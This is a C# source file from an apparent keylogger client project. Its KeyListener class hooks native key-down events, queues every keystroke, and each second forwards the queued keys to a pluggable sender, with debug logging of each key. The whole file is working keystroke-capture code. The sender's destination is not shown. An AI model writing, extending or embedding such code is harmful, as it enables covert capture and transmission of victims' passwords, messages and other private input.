using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal class KeyListener : IDisposable
{
    private readonly NativeKeyListener nativeListener = new NativeKeyListener();
    private ConcurrentQueue<AbstractKeyInfo> keysQueue { get; set; } = new ConcurrentQueue<AbstractKeyInfo>();
    public ISender? sender { get; set; } = null;
    private readonly System.Timers.Timer flushTimer = new System.Timers.Timer(1000);
    private Ref<bool> isListen { get; set; } = Ref<bool>.create(false);
    private static KeyListener? instance = null;
    public static KeyListener Instance
    {
        get
        {
            if(instance == null)
                instance = new KeyListener();
            return instance;
        }
    }

    public KeyListener()
    {
        nativeListener.onKeyDown += takeKey;
        flushTimer.Elapsed += (caller, e) =>
        {
            if(sender != null)
                lock (sender)
                {
                    while (keysQueue.Count > 0)
                    {
                        AbstractKeyInfo? sendObj;
                        keysQueue.TryDequeue(out sendObj);
                        if (sendObj != null)
                        {
                            sender.Send(sendObj);
                            Log<KeyListener>.Instance.logger?.LogDebug($"KeyListener sending key information: {sendObj.ToString()}");
                        }
                    }
                }
        };
        flushTimer.Start();
    }
    ~KeyListener()
    {
        this.Dispose();
    }
    public async Task<bool> listenAsync()
    {
        lock (isListen)
        {
            if (!isListen.item)
                isListen = isListen << true;
            else
                return false;
        }
        return await nativeListener.listenAsync();
    }

    public async Task stopListenAsync()
    {
        await nativeListener.stopListenAsync();
        lock (isListen)
        {
            isListen = isListen << false;
        }
    }
    private void takeKey(AbstractKeyInfo info)
    {
        keysQueue.Enqueue(info);
    }


    public void Dispose()
    {
        nativeListener.Dispose();
    }

}
